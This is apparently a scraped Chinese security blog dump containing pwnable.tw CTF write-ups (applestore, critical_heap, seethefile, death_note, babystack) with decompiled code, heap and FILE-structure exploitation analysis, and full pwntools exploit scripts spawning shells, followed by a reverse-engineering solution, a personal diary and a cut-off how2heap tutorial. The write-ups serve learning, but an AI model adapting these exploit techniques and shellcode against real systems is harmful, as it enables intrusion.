时出现这种报错：ValueError: seek out of range ， 多半就是文件没下载完全。。 题目主要功能 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748int menu()&#123; puts(&quot;=== Menu ===&quot;); printf(&quot;%d: Apple Store\\n&quot;, 1); printf(&quot;%d: Add into your shopping cart\\n&quot;, 2); printf(&quot;%d: Remove from your shopping cart\\n&quot;, 3); printf(&quot;%d: List your shopping cart\\n&quot;, 4); printf(&quot;%d: Checkout\\n&quot;, 5); return printf(&quot;%d: Exit\\n&quot;, 6);&#125;unsigned int handler()&#123; char nptr; // [esp+16h] [ebp-22h] unsigned int v2; // [esp+2Ch] [ebp-Ch] v2 = __readgsdword(0x14u); while ( 1 ) &#123; printf(&quot;&gt; &quot;); fflush(stdout); my_read(&amp;nptr, 0x15u); switch ( atoi(&amp;nptr) ) &#123; case 1: list(); break; case 2: add(); break; case 3: delete(); break; case 4: cart(); break; case 5: checkout(); break; case 6: puts(&quot;Thank You for Your Purchase!&quot;); return __readgsdword(0x14u) ^ v2; default: puts(&quot;It&apos;s not a choice! Idiot.&quot;); break; &#125; &#125;&#125; 其他函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135unsigned int add() //添加购物车，采用了my_read函数，但是存在问题，也就是在read时可以输入\\x00在中间分隔，以便在不影响后面的基础上，覆盖后面栈上的内容。&#123; char **v1; // [esp+1Ch] [ebp-2Ch] char nptr; // [esp+26h] [ebp-22h] unsigned int v3; // [esp+3Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Device Number&gt; &quot;); fflush(stdout); my_read(&amp;nptr, 0x15u); switch ( atoi(&amp;nptr) ) &#123; case 1: v1 = create((int)&quot;iPhone 6&quot;, (char *)199); insert((int)v1); goto LABEL_8; case 2: v1 = create((int)&quot;iPhone 6 Plus&quot;, (char *)299); insert((int)v1); goto LABEL_8; case 3: v1 = create((int)&quot;iPad Air 2&quot;, (char *)499); insert((int)v1); goto LABEL_8; case 4: v1 = create((int)&quot;iPad Mini 3&quot;, (char *)399); insert((int)v1); goto LABEL_8; case 5: v1 = create((int)&quot;iPod Touch&quot;, (char *)199); insert((int)v1);LABEL_8: printf(&quot;You&apos;ve put *%s* in your shopping cart.\\n&quot;, *v1); puts(&quot;Brilliant! That&apos;s an amazing idea.&quot;); break; default: puts(&quot;Stop doing that. Idiot!&quot;); break; &#125; return __readgsdword(0x14u) ^ v3;&#125;int cart()&#123; signed int v0; // eax signed int v2; // [esp+18h] [ebp-30h] int cost; // [esp+1Ch] [ebp-2Ch] _DWORD *i; // [esp+20h] [ebp-28h] char buf; // [esp+26h] [ebp-22h] unsigned int v6; // [esp+3Ch] [ebp-Ch] v6 = __readgsdword(0x14u); v2 = 1; cost = 0; printf(&quot;Let me check your cart. ok? (y/n) &gt; &quot;); fflush(stdout); my_read(&amp;buf, 0x15u); if ( buf == &apos;y&apos; ) &#123; puts(&quot;==== Cart ====&quot;); //遍历链表来输出cart for ( i = (_DWORD *)mycart; i; i = (_DWORD *)i[2] ) &#123; v0 = v2++; printf(&quot;%d: %s - $%d\\n&quot;, v0, *i, i[1]); // i[1] == money cost += i[1]; &#125; &#125; return cost;&#125;unsigned int delete()&#123; signed int v1; // [esp+10h] [ebp-38h] _DWORD *v2; // [esp+14h] [ebp-34h] int v3; // [esp+18h] [ebp-30h] int FD; // [esp+1Ch] [ebp-2Ch] int BK; // [esp+20h] [ebp-28h] char nptr; // [esp+26h] [ebp-22h] unsigned int v7; // [esp+3Ch] [ebp-Ch] v7 = __readgsdword(0x14u); v1 = 1; v2 = (_DWORD *)mycart; printf(&quot;Item Number&gt; &quot;); fflush(stdout); my_read(&amp;nptr, 0x15u); v3 = atoi(&amp;nptr); while ( v2 ) &#123; if ( v1 == v3 ) //典型的unlink &#123; FD = v2[2]; BK = v2[3]; if ( BK ) *(_DWORD *)(BK + 8) = FD; if ( FD ) *(_DWORD *)(FD + 12) = BK; printf(&quot;Remove %d:%s from your shopping cart.\\n&quot;, v1, *v2); return __readgsdword(0x14u) ^ v7; &#125; ++v1; v2 = (_DWORD *)v2[2]; &#125; return __readgsdword(0x14u) ^ v7;&#125;unsigned int checkout()&#123; int v1; // [esp+10h] [ebp-28h] char *v2; // [esp+18h] [ebp-20h] int v3; // [esp+1Ch] [ebp-1Ch] unsigned int v4; // [esp+2Ch] [ebp-Ch] v4 = __readgsdword(0x14u); v1 = cart(); if ( v1 == 7174 ) &#123; puts(&quot;*: iPhone 8 - $1&quot;); asprintf(&amp;v2, &quot;%s&quot;, &quot;iPhone 8&quot;); v3 = 1; insert((int)&amp;v2); v1 = 7175; &#125; printf(&quot;Total: $%d\\n&quot;, v1); puts(&quot;Want to checkout? Maybe next time!&quot;); return __readgsdword(0x14u) ^ v4;&#125; 分析在不断的使用添加购物车的函数add后，其形成了一个链表，而在输出时是通过遍历链表来依次输出的。结构str大概如下： 1234str[0]: coststr[1]: name---&gt; 实际为指针str[2]: FDstr[3]: BK 而我们在输入时使用的my_read函数（cart/delete函数均调用）因为可以覆盖后面的栈，所以会有希望去修改链表的节点为got表之类的。然后cart函数来泄露libc基址等等。 同时，在delete函数中使用了unlink的过程，也有利用的希望。RELRO不是full说明GOT表还是可以修改的，所以可以用unlink来修改got表. 1234567# checksec applestore[*] &apos;/root/pwnable/applestore/applestore&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 不过漏洞利用的切入点其实在后面，在checkout函数里，当购物车金额达到7174，就会赠送一个iphone8…而偏偏赠送的这个iphone8被放在了栈里面。而其实这几个函数用的都是同一栈帧（栈顶或许有差异，但是栈底是一致的），而恰好存储iphone8的位置在其他函数中可以被修改。也就是链表的结尾分配到了我们可以修改的栈上。 除此以外，需要栈地址的泄露，可以： 利用前面的leak洞,从第一个chunk开始,不断leak chunk的fd,直到stack上的chunk的前一个的chunk的fd,即可得到stack 我们可以用environ变量加上libc的基址来得到栈地址。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import *#sh = process(&apos;./applestore&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10104)bin = ELF(&apos;./applestore&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)def buy(idx): sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;Device Number&gt; &apos;) sh.sendline(str(idx))def dele(idx): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Item Number&gt; &apos;) sh.sendline(str(idx))def dele2(con): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Item Number&gt; &apos;) sh.sendline(con)def show(con): sh.sendline(&apos;4&apos;) sh.recvuntil(&apos;(y/n) &gt; &apos;) sh.sendline(con)def checkout(): sh.sendline(&apos;5&apos;) sh.recvuntil(&apos;(y/n) &gt; &apos;) sh.sendline(&apos;y&apos;)for i in range(20): buy(2)for i in range(6): buy(1)checkout()pay = &apos;y\\x00&apos;pay+=p32(bin.got[&apos;puts&apos;]) + 3*p32(0)show(pay)sh.recvuntil(&apos;27: &apos;)libc.address = u32(sh.recv(4))-libc.symbols[&apos;puts&apos;]envp = libc.symbols[&apos;environ&apos;]system = libc.symbols[&apos;system&apos;]success(&apos;libc_base: &apos;+hex(libc.address))success(&apos;envp: &apos;+hex(envp))pay = &apos;y\\x00&apos;pay+=p32(envp)+p32(1)+p32(0)+p32(0)show(pay)sh.recvuntil(&apos;27: &apos;)stack_envp = u32(sh.recv(4))success(&apos;stack_envp: &apos;+hex(stack_envp)) //通过environ泄露栈地址//仍未理解的过程：交换GOT和ebp,从而子函数ret后回到main,ebp会到GOT上,在main中read,会读到GOT表上,可以改写atoi到system.ebp = stack_envp-0x104atoi_got = bin.got[&apos;atoi&apos;]pay = &apos;27&apos;pay += p32(envp)+p32(1)+p32(ebp-0xc)+p32(atoi_got+0x20-2)dele2(pay)pay = &apos;$0\\x00\\x00&apos;+p32(system)sh.sendline(pay)sh.interactive() critical_heap难到仅有的wp基本上完全看不懂。。。 题目题目比较长，功能比较丰富。。 分析出来的结构体： 1234567891011121314151617181920212223242526272829303132struct clock&#123; int *name; int inuse; 0xDEADBEEF; char[4] year; char[4] month; char[4] day; char[4] hour; char[4] minute; char[4] second;&#125;; struct system&#123; int *name; int inuse; 0x48694869; string PathOfSystem; string DetailOfSystem; char[4] UserOfSystem; char[4] NameOfSystem; char[4] rand;&#125;; struct normal&#123; int *name; int inuse; 0x13371337; char[40] content; int sig;&#125;; 分析完全没有见过的漏洞。。。相较于文件漏洞，倒更像是函数源码漏洞与小小的文件漏洞相配合产生的大问题。。。 localtime和setenv配合能将任意文件内容写到heap上. chunk_system的detail在offset 0x20,chunk_normal的content在offset 0x18的位置,content读取的时候没有截断,而detail是存在栈上的,因此可以leak heap. （比较容易想到的漏洞,文件漏洞）. 在normal_heap的play下,有一个printf_chk的fmt洞,配合normal_heap的play下的change content就能在栈上留下信息,然后任意地址读(因为有chk,所以应该是无法用%n来任意地址写的). 第一步需要看localtime的源码：以libc2.23源码为例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166/* Return the `struct tm&apos; representation of *T in local time. */struct tm *localtime (const time_t *t)&#123; return __tz_convert (t, 1, &amp;_tmbuf);&#125;libc_hidden_def (localtime)/* Return the `struct tm&apos; representation of *TIMER in the local timezone. Use local time if USE_LOCALTIME is nonzero, UTC otherwise. */struct tm *__tz_convert (const time_t *timer, int use_localtime, struct tm *tp)&#123; long int leap_correction; int leap_extra_secs; if (timer == NULL) &#123; __set_errno (EINVAL); return NULL; &#125; __libc_lock_lock (tzset_lock); /* Update internal database according to current TZ setting. POSIX.1 8.3.7.2 says that localtime_r is not required to set tzname. This is a good idea since this allows at least a bit more parallelism. */ tzset_internal (tp == &amp;_tmbuf &amp;&amp; use_localtime, 1); if (__use_tzfile) __tzfile_compute (*timer, use_localtime, &amp;leap_correction, &amp;leap_extra_secs, tp); &lt;--无关代码省略--&gt; return tp;&#125;/* Interpret the TZ envariable. */static voidinternal_functiontzset_internal (int always, int explicit)&#123; static int is_initialized; const char *tz; if (is_initialized &amp;&amp; !always) return; is_initialized = 1; /* Examine the TZ environment variable. */ tz = getenv (&quot;TZ&quot;);//★注意此处,从env中读取TZ的值 if (tz == NULL &amp;&amp; !explicit) /* Use the site-wide default. This is a file name which means we would not see changes to the file if we compare only the file name for change. We want to notice file changes if tzset() has been called explicitly. Leave TZ as NULL in this case. */ tz = TZDEFAULT; if (tz &amp;&amp; *tz == &apos;\\0&apos;) /* User specified the empty string; use UTC explicitly. */ tz = &quot;Universal&quot;; /* A leading colon means &quot;implementation defined syntax&quot;. We ignore the colon and always use the same algorithm: try a data file, and if none exists parse the 1003.1 syntax. */ if (tz &amp;&amp; *tz == &apos;:&apos;) ++tz; /* Check whether the value changed since the last run. */ if (old_tz != NULL &amp;&amp; tz != NULL &amp;&amp; strcmp (tz, old_tz) == 0) /* No change, simply return. */ return; if (tz == NULL) /* No user specification; use the site-wide default. */ tz = TZDEFAULT; tz_rules[0].name = NULL; tz_rules[1].name = NULL; /* Save the value of `tz&apos;. */ free (old_tz); old_tz = tz ? __strdup (tz) : NULL; /* Try to read a data file. */ __tzfile_read (tz, 0, NULL);//★带着TZ进入__tzfile_read函数 if (__use_tzfile) return;&lt;--无关代码省略--&gt;&#125;void__tzfile_read (const char *file, size_t extra, char **extrap)&#123; static const char default_tzdir[] = TZDIR; size_t num_isstd, num_isgmt; FILE *f; struct tzhead tzhead; size_t chars; size_t i; size_t total_size; size_t types_idx; size_t leaps_idx; int was_using_tzfile = __use_tzfile; int trans_width = 4; size_t tzspec_len; char *new = NULL; if (sizeof (time_t) != 4 &amp;&amp; sizeof (time_t) != 8) abort (); __use_tzfile = 0; if (file == NULL) /* No user specification; use the site-wide default. */ file = TZDEFAULT; else if (*file == &apos;\\0&apos;) /* User specified the empty string; use UTC with no leap seconds. */ goto ret_free_transitions; else &#123; /* We must not allow to read an arbitrary file in a setuid program. So we fail for any file which is not in the directory hierachy starting at TZDIR and which is not the system wide default TZDEFAULT. */ if (__libc_enable_secure &amp;&amp; ((*file == &apos;/&apos; &amp;&amp; memcmp (file, TZDEFAULT, sizeof TZDEFAULT) &amp;&amp; memcmp (file, default_tzdir, sizeof (default_tzdir) - 1)) || strstr (file, &quot;../&quot;) != NULL)) /* This test is certainly a bit too restrictive but it should catch all critical cases. */ goto ret_free_transitions; &#125; if (*file != &apos;/&apos;) &#123; const char *tzdir; tzdir = getenv (&quot;TZDIR&quot;);//★从环境变量TZDIR中读取目录 if (tzdir == NULL || *tzdir == &apos;\\0&apos;) tzdir = default_tzdir; if (__asprintf (&amp;new, &quot;%s/%s&quot;, tzdir, file) == -1) goto ret_free_transitions; file = new; &#125; /* If we were already using tzfile, check whether the file changed. */ struct stat64 st; if (was_using_tzfile &amp;&amp; stat64 (file, &amp;st) == 0 &amp;&amp; tzfile_ino == st.st_ino &amp;&amp; tzfile_dev == st.st_dev &amp;&amp; tzfile_mtime == st.st_mtime) goto done; /* Nothing to do. */ /* Note the file is opened with cancellation in the I/O functions disabled and if available FD_CLOEXEC set. */ f = fopen (file, &quot;rce&quot;);//★打开文件 最后是通过malloc读取文件内容到heap上的，所以我们只需要控制TZ 和 TZDIR 就能读取flag内容到heap上；（类似于函数源码漏洞？） printf_chk 源码 12345678910111213141516171819202122/* Write formatted output to stdout from the format string FORMAT. */int___printf_chk (int flag, const char *format, ...)&#123; va_list ap; int done; _IO_acquire_lock_clear_flags2 (stdout); if (flag &gt; 0) stdout-&gt;_flags2 |= _IO_FLAGS2_FORTIFY; va_start (ap, format); done = vfprintf (stdout, format, ap); va_end (ap); if (flag &gt; 0) stdout-&gt;_flags2 &amp;= ~_IO_FLAGS2_FORTIFY; _IO_release_lock (stdout); return done;&#125;ldbl_strong_alias (___printf_chk, __printf_chk) printf_chk 格式化字符串漏洞。。。神奇、、 seethefile第一次见FILE题，学习一下 题目功能 1234567891011int menu()&#123; puts(&quot;---------------MENU---------------&quot;); puts(&quot; 1. Open&quot;); puts(&quot; 2. Read&quot;); puts(&quot; 3. Write to screen&quot;); puts(&quot; 4. Close&quot;); puts(&quot; 5. Exit&quot;); puts(&quot;----------------------------------&quot;); return printf(&quot;Your choice :&quot;);&#125; open打开文件，read读入0x18f的数据，如果文件名或读入的数据中没有‘flag’ 或 ‘FLAG’，就能够write到屏幕上，close关闭文件，exit时让输入姓名，会溢出。 分析后面给了一个明显的溢出，也就是我们的切入点，gdb调试发现name在bss段，后面只有一个指向文件的fp指针，意图很明显。我们可以先读取/map/self/maps 来获取程序的段信息，虽然能读入的信息较少，但是足以获得heap基地址以用来得到libc基地址。至于fp指针，需要将其覆盖并继续溢出伪造一个FILE结构体，fp指针就是指向这个结构体以避免程序错误退出，同时将伪造的虚表上的vtable该为system，fclose即可即可调用system。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context.log_level = &apos;debug&apos;#sh = process(&apos;./seethefile&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10200)elf = ELF(&apos;./seethefile&apos;)libc = ELF(&apos;./libc_32.so.6&apos;)def open(name): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;see :&apos;) sh.sendline(name)def read(): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;2&apos;)def write(): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;3&apos;)def close(): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;4&apos;)def exit(con): sh.recvuntil(&apos;Your choice :&apos;) sh.sendline(&apos;5&apos;) sh.recvuntil(&apos;Leave your name :&apos;) sh.sendline(con)open(&apos;/proc/self/maps&apos;)read()write()sh.recvline()sh.recvline()sh.recvline()heap = int(sh.recvline()[:8],16)success(&apos;heap: &apos;+hex(heap))libc.address = int(sh.recvline()[:8],16)+0x1000success(&apos;libc_base: &apos;+hex(libc.address))system = libc.symbols[&apos;system&apos;]close()pay = &apos;\\x00&apos;*32 + p32(0x0804B300)pay+=&apos;\\x00&apos;*(0x80-4)file = &apos;\\xff\\xff\\xff\\xff;$0\\x00&apos;.ljust(0x48,&apos;\\x00&apos;)file = file.ljust(0x94,&apos;\\x00&apos;) //在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0x228;pay+=filepay+=p32(0x0804B300+0x98)pay+=p32(system)*21#vtableexit(pay)sh.interactive() death_note话说这边的题难度真是飘忽不定。。 题目123456789101112131415161718192021int menu()&#123; puts(&quot;-----------------------------------&quot;); puts(&quot; DeathNote &quot;); puts(&quot;-----------------------------------&quot;); puts(&quot; 1. Add a name &quot;); puts(&quot; 2. show a name on the note &quot;); puts(&quot; 3. delete a name int the note &quot;); puts(&quot; 4. Exit &quot;); puts(&quot;-----------------------------------&quot;); return printf(&quot;Your choice :&quot;);&#125;# checksec death_note[*] &apos;/root/pwnable/death_note1/death_note&apos; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 分析题目的功能就是menu上的那样，不过在里面add的时候，index是自己选的，而且没有任何限制， 所以是有希望随便输入负数，将name也就是我们要输入的shellcode往上覆盖到got表来get shell。 输入的内容会进行检查，必须是可打印字符且最长为0x50，所以shellcode也需要在限制条件之内。shellcode可以使用metasploit自带的msfvenom来生成。 12 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253from pwn import *sh = process(&apos;./death_note&apos;)sh = remote(&apos;chall.pwnable.tw&apos;, 10201)def add(idx,con): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;Index :&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;Name :&apos;) sh.sendline(con)def dele(idx): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Index :&apos;) sh.sendline(str(idx))pay = asm(&apos;&apos;&apos;/* execve(&apos;/bin///sh&apos;,0,0)*/push 0x68push 0x732f2f2fpush 0x6e69622fpush esppop ebx /*set ebx to &apos;/bin///sh&apos;*/push edxdec edxdec edx /*set dl to 0xfe*/xor [eax+32],dl /*decode int 0x80*/xor [eax+33],dl /*decode int 0x80*/inc edxinc edx /*recover edx to 0*/push edxpop ecx /*set ecx to 0*/push 0x40pop eaxxor al,0x4b /*set eax to 0xb*//*int 0x80*/&apos;&apos;&apos;)+&apos;\\x33\\x7e&apos;add(-19,pay)dele(-19)sh.interactive() babystack终于有时间继续做了、、 题目保护全开。。。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; _QWORD *v3; // rcx __int64 v4; // rdx char des; // [rsp+0h] [rbp-60h] __int64 buf; // [rsp+40h] [rbp-20h] __int64 v8; // [rsp+48h] [rbp-18h] char v9; // [rsp+50h] [rbp-10h] mmap_for_proc(); files[0] = open(&quot;/dev/urandom&quot;, 0); read(files[0], &amp;buf, 0x10uLL); v3 = IsMmap_ptr; v4 = v8; *IsMmap_ptr = buf; v3[1] = v4; close(files[0]); while ( 1 ) &#123; write(1, &quot;&gt;&gt; &quot;, 3uLL); _read_chk(0LL, &amp;v9, 0x10LL, 0x10LL); if ( v9 == &apos;2&apos; ) break; if ( v9 == &apos;3&apos; ) &#123; if ( password_inuse ) read_to_des(&amp;des); else puts(&quot;Invalid choice&quot;); &#125; else if ( v9 == &apos;1&apos; ) &#123; if ( password_inuse ) password_inuse = 0; else login(&amp;buf); &#125; else &#123; puts(&quot;Invalid choice&quot;); &#125; &#125; if ( !password_inuse ) exit(0); if ( memcmp(&amp;buf, IsMmap_ptr, 0x10uLL) ) JUMPOUT(loc_100B); return 0LL;&#125;int __fastcall login(const char *buf)&#123; size_t len; // rax char s; // [rsp+10h] [rbp-80h] printf(&quot;Your passowrd :&quot;); read_int(&amp;s, 0x7Fu); len = strlen(&amp;s); if ( strncmp(&amp;s, buf, len) ) return puts(&quot;Failed !&quot;); password_inuse = 1; return puts(&quot;Login Success !&quot;);&#125;int __fastcall read_to_des(char *des)&#123; char src; // [rsp+10h] [rbp-80h] printf(&quot;Copy :&quot;); read_int(&amp;src, 0x3Fu); strcpy(des, &amp;src); return puts(&quot;It is magic copy !&quot;);&#125; 分析main函数刚开始随机得到0x10个字节的数据并将其复制到buf处，并将全局变量指针*IsMmap_ptr指向该内存。read_chk读入参数，1-login(与随机得到的0x10个字节进行比较输入字节长度len的密码是否正确)或清除密码标志位密码，2-退出，3-检查密码标志位，为1则可读入0x3f字节的数据复制到des处 问题： login时可以不输入密码，直接回车可以跳过判定；或者以/x00开头跳过判定；或者可以依次爆破得到随机数password。 strcpy将src处的值复制到des，靠的是识别末尾处的/x00截断，而read_int并不会自动给加上/x00，因为输入字节的限制，看上去感觉并不会溢出，但是因为login函数用的是同一个栈段，所以有希望在src[0x3f]处将其置为非/x00，这样strcpy便会产生溢出。 为了getshell，rop不太可能–canary的存在，使得可能爆破出来的canary在最后会有/x00截断，这样strcpy就没法溢出到返回地址处了。所以应该要使用Onegadget一发入魂，但是libc地址搞不出来。。。。 得到大佬的思路：strcpy后原来的buf处变为两个libc中的地址，将其泄露计算libc基地址即可（ps：这一步仍有问题） exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# one_gadget ./libc_64.so.6 0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: rax == NULL0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xef6c4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf0567 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints: [rsp+0x70] == NULLfrom pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./babystack&apos;)libc = ELF(&apos;./libc_64.so.6&apos;)bin = ELF(&apos;./babystack&apos;)one_gadget_offset = 0x45216def copy(): sh.recvuntil(&apos;&gt;&gt; &apos;) sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Copy :&apos;) sh.send(s)def login(pwd,lo=1): if lo: sh.send(&apos;1&apos;+&apos;a&apos;*15) else: sh.send(&apos;1&apos;) sh.recvuntil(&apos;Your passowrd :&apos;) sh.send(pwd) return sh.recvuntil(&apos;&gt;&gt; &apos;)def guess(length,secret=&apos;&apos;): for i in range(length): for q in range(1,256): if &apos;Success&apos; in login(secret+chr(q)+&apos;\\n&apos;,False): secret+=chr(q) sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;&gt;&gt; &apos;) break return secretdef logout(): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;&gt;&gt; &apos;)# 爆破随机数secret = guess(16)# 绕过login，将src[0x3f]设置为非0，并将随机数位置变为libc的地址login(&apos;\\x00&apos;+&apos;a&apos;*0x57)copy(&apos;a&apos;*0x40)logout()# strcpy溢出泄露buf位置的libcbase = u64(guess(6,&apos;a&apos;*16+&apos;1&apos;+&apos;a&apos;*7)[24:]+&apos;\\x00\\x00&apos;)-324-libc.symbols[&apos;setvbuf&apos;] //泄漏的位置有点诡异。。。one_gadget_addr = one_gadget_offset + base## 覆盖返回地址到one_gadget_addr 得到shellpay = &apos;\\x00&apos; + &apos;a&apos; * 0x3f + secret + &apos;a&apos; *0x18 + p64(one_gadget_addr)login(pay)copy(&apos;a&apos;*0x40)sh.sendline(&apos;2&apos;)sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Jarvis Oj-reverse","slug":"jarvis-oj-reverse","date":"2018-11-06T08:01:46.000Z","updated":"2018-11-06T10:10:01.193Z","comments":true,"path":"2018/11/06/jarvis-oj-reverse/","link":"","permalink":"http://siriuswhiter.tk/2018/11/06/jarvis-oj-reverse/","excerpt":"","text":"稍微学学逆向 FindKey 拿到文件顺手就往ida里拖，结果说是bin文件，所以还是乖乖将他拖到了kali里，file查看文件属性，是个pyc？（仿佛想到了某入群题） 将pyc还原成py文件 发现一个简单的加密过程（不过还是有点没太明白那个 +- &amp; 的执行顺序） 直接上wp 1234567891011import syslookup = [ 196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139] pwda = [ 188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]pwdb = [53,222,230,35,67,248 226,216,17,209,32,2,181,200,171,60,108]flag = &quot; &quot;for i in range (0,17): flag += chr(lookup[i + pwdb[i]] - pwda[i] &amp; 255 )f = flag[::-1]print(f) 对od产生了深深的抗拒！！ 除了打开会报毒，用起来整个电脑都卡炸了！！ 差点gg","categories":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/categories/re/"}],"tags":[{"name":"RE","slug":"re","permalink":"http://siriuswhiter.tk/tags/re/"}]},{"title":"diary-20181027","slug":"diary-20181027","date":"2018-10-27T02:42:19.000Z","updated":"2018-10-27T03:03:57.266Z","comments":true,"path":"2018/10/27/diary-20181027/","link":"","permalink":"http://siriuswhiter.tk/2018/10/27/diary-20181027/","excerpt":"","text":"或许真的是极尽苦难的一周。 也是一事无成的一周。 少有的一个星期什么也干不成，任何一件本应该简简单单的事情都会动辄四五个小时而迎来没有任何变化的结果。 虚拟机上周已被搞得一塌糊涂，真的是失去才知道原来环境配置的多么棒。仅仅为了装pwndbg，将整个gdb给搞出了问题，并且无力回天。 再之后为了装docker，看了许许多多的教程，又是大片大片的时间丢失，结果最后在角落里找到的方法，仅仅只用在src文件中加上docker的源地址，update就好了，心力交瘁。 虚拟机装go的环境还算简单，没有太大的麻烦。而想着不能每次都打开虚拟机来写go，再加上意图要和同学搞个英才工程的python的团队项目，就想直接搞个vscode加上各个语言的插件呗，事实证明，这真是一个错误的选择，各种奇奇怪怪的报错，环境配置，乱到不行的目录，还是解决不了，两天就这样再次流失。 所以还是选择了jetbrain家的pycharm和goland，pycharm倒是本本分分，goland却又是环境配置，还有项目的目录什么的，搞来搞去，goland的terminal又无法打开，寻找答案无果，重新安装，无果。抱着不准备管的心态，又突然不知道为什么就好了。。。蜜汁计算机。 不出意外的话下个月还得去打一场工控比赛，为此又得学一下PLC的逆向，目前看来资料少的可怜，尽力而为吧。","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Introduction to pwn2.2-fastbin_dup_consolidate","slug":"introduction-to-pwn2-2-fastbin-dup-consolidate","date":"2018-10-18T08:43:27.000Z","updated":"2018-10-20T03:39:45.388Z","comments":true,"path":"2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/","link":"","permalink":"http://siriuswhiter.tk/2018/10/18/introduction-to-pwn2-2-fastbin-dup-consolidate/","excerpt":"","text":"比较神奇的一个利用。pwntools —&gt; cyclic cyclic_findi locals fastbin_dup_consolidate原理 当创建一个0x20-0x80大小的chunk并free的话，该chunk会被放入fastbins，此时如果再次free便会报错；但是如果此时分配一个比较大的chunk（起码smallbin大小），便会触发程序的malloc_consolidate这个结果就是该chunk不再在fastbins中了，实际被转移到了unsortedbins。所以我们可以double free。 继续使用how2heap的例子来理解。12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;int main() &#123; void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\\n&quot;, p1, p2); fprintf(stderr, &quot;Now free p1!\\n&quot;); free(p1); void* p3 = malloc(0x400); fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\\n&quot;, p3); fprintf(stderr, 